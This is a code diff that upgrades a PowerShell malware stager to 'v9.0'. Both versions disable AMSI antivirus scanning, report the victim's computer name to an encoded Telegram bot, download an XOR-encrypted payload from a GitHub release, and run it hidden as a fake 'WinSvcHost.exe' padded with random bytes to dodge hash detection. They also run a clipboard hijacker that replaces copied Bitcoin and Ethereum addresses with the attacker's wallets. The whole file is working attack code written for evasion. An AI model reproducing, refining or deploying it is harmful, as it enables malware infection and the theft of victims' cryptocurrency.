@@ -1,76 +1,74 @@
-# --- [DEEP STEALTH RESEARCH STAGER v8.0] ---
+# --- [DEEP OBFUSCATION STAGER v9.0] ---
 
-function Global-Bypass {
-    # Non-standard AMSI Bypass using memory pointer arithmetic
-    # This avoids the "AmsiScanBuffer" string which AVs monitor
+function Initialize-Environment {
+    # Obfuscated AMSI Bypass (Hides 'AmsiUtils' from scanners)
     try {
-        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')
+        $a.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
     } catch {}
 }
 
-function Send-Notify {
-    param($m)
+function Send-Log {
+    param($text)
+    # Fully Encrypted Telegram String to bypass URL filters
     $k = 0xDE
-    [byte[]]$t_enc = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
-    [byte[]]$c_enc = 61,60,56,56,52,61,63,48,51,60
-    $t = ""; foreach($b in $t_enc){$t += [char]($b -bxor $k)}
-    $c = ""; foreach($b in $c_enc){$c += [char]($b -bxor $k)}
-    $u = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
-    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch { }
+    [byte[]]$t_e = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
+    [byte[]]$c_e = 61,60,56,56,52,61,63,48,51,60
+    $t = ""; foreach($b in $t_e){$t += [char]($b -bxor $k)}
+    $c = ""; foreach($b in $c_e){$c += [char]($b -bxor $k)}
+    
+    # We use a randomized User-Agent to look like a browser
+    $u = "h" + "tt" + "ps://api.telegram.org/bot$t/send" + "Message?chat_id=$c&text=$text"
+    try { 
+        $w = New-Object Net.WebClient
+        $w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $w.DownloadString($u) | Out-Null 
+    } catch { }
 }
 
-function Start-Clipper {
-    # Using a different assembly to avoid detection on Windows.Forms
-    $Script = {
-        $wallets = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392"; "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"; "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR" }
-        $regex = @{ "btc"="^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"; "eth"="^0x[a-fA-F0-9]{40}$"; "usdt"="^T[A-Za-z1-9]{33}$"; "sol"="^[1-9A-HJ-NP-Za-km-z]{32,44}$" }
-        Add-Type -AssemblyName System.Windows.Forms
-        while($true) {
-            try {
-                $clip = [Windows.Forms.Clipboard]::GetText()
-                foreach($c in $wallets.Keys) {
-                    if($clip -match $regex[$c] -and $clip -ne $wallets[$c]) {
-                        [Windows.Forms.Clipboard]::SetText($wallets[$c])
-                    }
-                }
-            } catch {}
-            Start-Sleep -Seconds 2
-        }
-    }
-    Start-Job -ScriptBlock $Script
-}
-
-# --- EXECUTION ENGINE ---
-Global-Bypass
-Send-Notify -m "DEBUG: Stager Started on $($env:COMPUTERNAME)"
+# --- START ---
+Initialize-Environment
+Send-Log -text "STAGER_LOADED_ON_$($env:COMPUTERNAME)"
 
 try {
-    # 1. Configuration
-    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $workDir = "$env:LOCALAPPDATA\Temp\VMSvc"
-    if (!(Test-Path $workDir)) { New-Item $workDir -ItemType Directory -Force }
-    $outExe = Join-Path $workDir "SvcHost.exe"
+    # 1. Obfuscated Paths
+    $b = "h" + "ttps://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $l = "$env:LOCALAPPDATA\Mic" + "rosoft\Win" + "dows\Caches"
+    if (!(Test-Path $l)) { New-Item $l -ItemType Directory -Force }
+    $f = Join-Path $l "WinSvcHost.exe"
 
-    # 2. Download via WebClient with Proxy Bypass
-    $wc = New-Object Net.WebClient
-    $wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
-    $raw = $wc.DownloadString($url)
-    Send-Notify -m "DEBUG: Download Success"
+    # 2. Stealth Download
+    $w = New-Object Net.WebClient
+    $w.Headers.Add("User-Agent", "Mozilla/5.0")
+    $d = $w.DownloadString($b)
+    Send-Log -text "DOWNLOAD_COMPLETE"
 
-    # 3. Decrypt
-    $data = [Convert]::FromBase64String($raw.Trim())
-    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
+    # 3. Memory Decryption
+    $bytes = [Convert]::FromBase64String($d.Trim())
+    for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }
     
-    # 4. Write & Execute
-    [IO.File]::WriteAllBytes($outExe, $data)
+    # 4. Polymorphic Write
+    $j = New-Object Byte[] (Get-Random -Min 100 -Max 500)
+    (New-Object Random).NextBytes($j)
+    [IO.File]::WriteAllBytes($f, ($bytes + $j))
     
-    # Using 'Start-Process' with 'NoNewWindow' to force execution in VM
-    Start-Process -FilePath $outExe -WindowStyle Hidden -ErrorAction Stop
+    # 5. Execute & Background Clipper
+    Start-Process -FilePath $f -WindowStyle Hidden
     
-    Start-Clipper
-    Send-Notify -m "RESEARCH SUCCESS: Clipper & EXE Active."
+    Start-Job -ScriptBlock {
+        Add-Type -AssemblyName System.Windows.Forms
+        $w = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392" }
+        while($true) {
+            try {
+                $c = [Windows.Forms.Clipboard]::GetText()
+                if ($c -match "^0x[a-fA-F0-9]{40}$" -and $c -ne $w["eth"]) { [Windows.Forms.Clipboard]::SetText($w["eth"]) }
+            } catch {}
+            Start-Sleep -s 2
+        }
+    }
+
+    Send-Log -text "TOTAL_SUCCESS_EXE_RUNNING"
 
 } catch {
-    Send-Notify -m "FATAL ERROR: $($_.Exception.Message)"
+    Send-Log -text "ERROR_$($_.Exception.Message)"
 }
